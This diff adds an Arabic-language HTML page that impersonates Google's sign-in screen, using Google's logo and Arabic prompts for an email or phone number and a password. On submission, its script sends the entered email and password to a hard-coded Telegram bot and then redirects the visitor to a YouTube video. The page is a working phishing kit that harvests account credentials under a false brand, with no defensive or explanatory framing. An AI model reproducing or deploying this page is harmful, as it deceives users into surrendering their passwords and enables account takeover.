@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تسجيل الدخول - Google</title>
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background-color: white;
+      width: 350px;
+      padding: 40px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      border-radius: 8px;
+      text-align: center;
+    }
+    .google-logo {
+      width: 75px;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1558b0;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+  <h2>تسجيل الدخول</h2>
+  <p>باستخدام حساب Google الخاص بك</p>
+  <form id="contactForm">
+    <input id="email" type="email" placeholder="البريد الإلكتروني أو رقم الهاتف">
+    <input id="password" type="password" placeholder="كلمة المرور">
+    <button type="submit">التالي</button>
+  </form>
+  <div class="footer">
+    ليس لديك حساب؟ <a href="#">إنشاء حساب</a>
+  </div>
+</div>
+
+<script>
+    document.getElementById("contactForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      
+      const name = document.getElementById("password").value;
+      const email = document.getElementById("email").value;
+
+      const message = `📝 Total:\npassword ${password}\nemail ${email}`;
+
+// بيانات البوت
+      const botToken = "8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8";
+      const chatId = "6405482546";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url).then(response => {
+        if (response.ok) {
+          window.location.href = "https://www.youtube.com/watch?v=6JDtiGJLbmM";
+        } else {
+          alert("حدث خطأ أثناء الإرسال ❌");
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
